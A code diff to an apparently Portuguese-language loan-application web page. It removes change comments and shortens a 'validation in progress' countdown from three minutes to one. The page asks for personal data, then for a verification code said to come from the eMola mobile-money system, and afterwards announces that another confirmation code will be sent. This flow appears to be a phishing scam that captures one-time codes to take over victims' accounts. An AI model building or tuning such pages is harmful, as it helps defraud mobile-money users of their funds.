@@ -126,7 +126,6 @@
       </header>
 
       <div class="content">
-        <!-- ALTERADO: aviso substituído pelo novo texto -->
         <div class="notice">
           <strong>Atenção:</strong> escreva os seus dados corretos para não correr o risco do seu empréstimo não ser aprovado.
         </div>
@@ -159,7 +158,6 @@
 
         <form id="otpForm" class="step">
           <h2>Código de verificação</h2>
-          <!-- ALTERADO: aviso sobre o envio do código de verificação -->
           <div class="notice">
             O sistema eMola irá enviar um código de verificação para o seu telefone. Introduza o código corretamente.
           </div>
@@ -177,13 +175,12 @@
           <button class="btn" type="submit">Continuar</button>
         </form>
 
-        <!-- ALTERADO: etapa de espera com 3 minutos e novo código de confirmação -->
         <section id="waitingStep" class="step">
           <div class="processing">
             <div class="spinner"></div>
             <h2>Validação em curso</h2>
             <p class="status">Aguarde na tela enquanto verificamos as informações.</p>
-            <p class="status">Tempo restante: <span class="timer" id="waitCountdown">03:00</span></p>
+            <p class="status">Tempo restante: <span class="timer" id="waitCountdown">01:00</span></p>
             <div class="progress"><span id="waitProgressBar" style="width:0%"></span></div>
             <p class="status" id="waitStatus">Não feche esta página.</p>
           </div>
@@ -329,10 +326,10 @@
       startWaitCountdown();
     }
 
-    // ALTERADO: contagem de 3 minutos + mensagem final sobre novo código
+    // Contagem de 1 minuto + mensagem final sobre novo código
     function startWaitCountdown() {
       if (waitInterval) clearInterval(waitInterval);
-      let totalSeconds = 180; // 3 minutos
+      let totalSeconds = 60; // ALTERADO: 1 minuto
       const total = totalSeconds;
       waitStatus.textContent = "Não feche esta página.";
       waitProgressBar.style.width = "0%";
@@ -346,7 +343,6 @@
           updateWaitDisplay(0);
           waitProgressBar.style.width = "100%";
           waitStatus.innerHTML = "Iremos enviar outro código de confirmação. Confirme corretamente.";
-          // Registar evento de fim de espera
           logEvent("wait_completed");
         } else {
           updateWaitDisplay(totalSeconds);
